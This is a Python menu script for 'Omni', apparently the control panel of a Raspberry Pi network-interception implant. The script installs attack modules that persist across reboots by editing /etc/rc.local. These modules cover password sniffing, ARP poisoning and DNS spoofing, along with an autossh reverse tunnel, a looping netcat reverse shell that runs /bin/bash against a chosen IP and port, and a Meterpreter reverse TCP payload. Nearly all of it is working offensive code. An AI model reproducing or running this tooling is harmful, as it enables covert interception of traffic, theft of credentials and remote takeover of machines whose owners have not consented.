from whiptail import Whiptail 
import os
import ipaddress

class choice:

    def __init__(self):
        print("Omni")

    @staticmethod
    def whipValue(name, description, input_type, mandatory):
        w = Whiptail(title=name) 
        loop = True

        while loop:
            if input_type == "I": # type IPv4
                value = w.inputbox(description)
                if value[1] == 1:  # cancel case 
                    return None
                try:
                    ipaddress.IPv4Address(value[0])  
                    loop = False 
                except ipaddress.AddressValueError:
                    w.msgbox("Invalid IPv4 address. Please enter a valid IPv4 address.")
            
            elif input_type == "P": #type Port
                value = w.inputbox(description)
                if value[0] == "" and mandatory == False :
                    return ""
                if value[1] == 1:  # Cancel case
                    return None
                try:
                    port = int(value[0])
                    if 0 <= port <= 65535:  
                        loop = False  
                    else:
                        w.msgbox("Invalid Port. Please enter a number between 0 and 65535.")
                except ValueError:
                    w.msgbox("Invalid Port. Please enter a valid integer.")

        return value[0]

    def pas(self):
        temp = open("/etc/rc.local", "r").read()
        temp = temp.replace("exit 0", "sudo python /home/pi/Int3rcept0r/pas/pas.py &\nexit 0")
        open("/etc/rc.local", "w").write(temp)
        print("\nPassword_Sniffing Completed\n")

    def arp(self):
        temp = open("/etc/rc.local", "r").read()
        temp = temp.replace("exit 0", "sudo python /home/pi/Int3rcept0r/arp/arp.py &\nexit 0")
        open("/etc/rc.local", "w").write(temp)
        print("\nARP_Poisoning Completed\n")

    def dns(self):
        open("/etc/dnsmasq.conf", "w").write(open("default_files/etc/dnsmasq.conf", "r").read())
        open("/etc/hosts", "w").write(open("dns/hosts", "r").read())
        os.system("sudo service dnsmasq restart")
        print("\nDNS_Spoofing Completed\n")

    def dns_dnsmasq(self):
        open("/etc/dnsmasq.conf", "w").write(open("dns/dnsmasq/dnsmasq.conf", "r").read())
        open("/etc/dnsmasq.hosts", "w").write(open("dns/hosts", "r").read())
        os.system("sudo service dnsmasq restart")
        print("\nDnsmasq_DNS_Spoofing Completed\n")
        
    def rev_ssh(self):
        ip = self.whipValue("Omni - Reverse SSH", "Destination IP:", "I", False)
        if ip is None:
            print("Exit...")
            exit()
        vps_port = self.whipValue("Omni - Reverse SSH", "Port:\t (leave blank for default => 22)", "P", False)
        if vps_port == "":
            vps_port = 22
        if vps_port is None:
            print("Exit...")
            exit()
        tunnel_port = self.whipValue("Omni - Reverse SSH", "Tunnel Port:\t (leave blank for default => 4444)", "P", False)
        if tunnel_port == "":
            tunnel_port = 4444
        if vps_port is None:
            print("Exit...")
            exit() 
        com = 'autossh -M 10387 -N -f -o "PubkeyAuthentication=yes" -o "PasswordAuthentication=no" -i /home/pi/.ssh/id_rsa -R %s:localhost:22 restricted_user@%s -p %s &' % (tunnel_port,ip,vps_port)
        temp = open("/etc/rc.local", "r").read()
        temp = temp.replace("exit 0", com + "\nexit 0")
        open("/etc/rc.local", "w").write(temp)
        print("\nReverse_SSH Completed\n")

    def rev_net(self):
        ip = self.whipValue("Omni - Reverse Netcat", "Destination IP:", "I", False)
        if ip is None:
            print("Exit...")
            exit()
        port = self.whipValue("Omni - Reverse Netcat", "Port:", "P", True)
        if port is None:
            print("Exit...")
            exit()
        com = 'while [ 1 ]; do nc %s %s -e /bin/bash; sleep 30; done'% (ip,port)
        open("rev_net/nc.sh", "w").write(com)
        temp = open("/etc/rc.local", "r").read()
        temp = temp.replace("exit 0", "/home/pi/Int3rcept0r/rev_net/nc.sh &" + "\nexit 0")
        open("/etc/rc.local", "w").write(temp)
        print("\nReverse_Netcat_Shell Completed\n")

    def rev_met(self):
        ip = self.whipValue("Omni - Reverse TCP Meterpreter", "Destination IP:", "I", False)
        if ip is None:
            print("Exit...")
            exit()
        port = self.whipValue("Omni - Reverse TCP Meterpreter", "Port:", "P", True)
        if port is None:
            print("Exit...")
            exit()
        temp = open("met/default/shell.py","r").read()
        temp = temp.replace("host", ip).replace("l_port", port)
        open("met/shell.py", "w").write(temp)
        temp = open("/etc/rc.local", "r").read()
        temp = temp.replace("exit 0", "python /home/pi/Int3rcept0r/met/shell.py & \nexit 0")
        open("/etc/rc.local", "w").write(temp)
        print("\nReverse_TCP_Meterpreter worked\n")

    def power_only(self):
        os.system('sudo sh -c "echo 0 > /proc/sys/net/ipv4/ip_forward"')
        temp = open("/etc/rc.local", "r").read()
        temp = temp.replace("iptables-restore < /etc/iptables.ipv4.nat", "")
        open("/etc/rc.local", "w").write(temp)
        print("\nPower_only Completed\n")

    def rst(self):
        open("/etc/rc.local", "w").write(open("default_files/etc/rc.local", "r").read())
        open("/etc/resolv.conf", "w").write(open("default_files/etc/resolv.conf", "r").read())
        open("/etc/dnsmasq.conf", "w").write(open("default_files/etc/dnsmasq.conf", "r").read())
        open("/etc/dnsmasq.hosts", "w").write(open("default_files/etc/dnsmasq.hosts", "r").read())
        open("/etc/hosts", "w").write(open("default_files/etc/hosts", "r").read())
        os.system("sudo service dnsmasq restart")
        os.system("sudo iptables-restore < /etc/iptables.ipv4.nat")
        os.system('sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"')
        print("\nReset Completed\n")

w = Whiptail(title="Omni - Menu")

options = [
    ("0", "Password Sniffing"),
    ("1", "Arp Spoofing"),
    ("2", "DNS Spoofing"),
    ("3", "DNS Spoofing (using dnsmasq)"),
    ("4", "Reverse SSH"),   
    ("5", "Reverse Netcat"),
    ("6", "Reverse TCP Meterpreter"),
    ("7", "USB power only"),
    ("8", "Reset to Default")
]

number = w.menu("Please select which module to run", options)
if number[1] == 0 :
    meth = int(number[0])
else:
    print("Exit...")
    exit(0)

if meth < 0 or meth > 8:
    print("Not a valid option!\n")
else:
    c = choice()
    options = {0:c.pas,
               1:c.arp,
               2:c.dns,
               3:c.dns_dnsmasq,
               4:c.rev_ssh,
               5:c.rev_net,
               6:c.rev_met,
               7:c.power_only,
               8:c.rst}
    options[meth]()

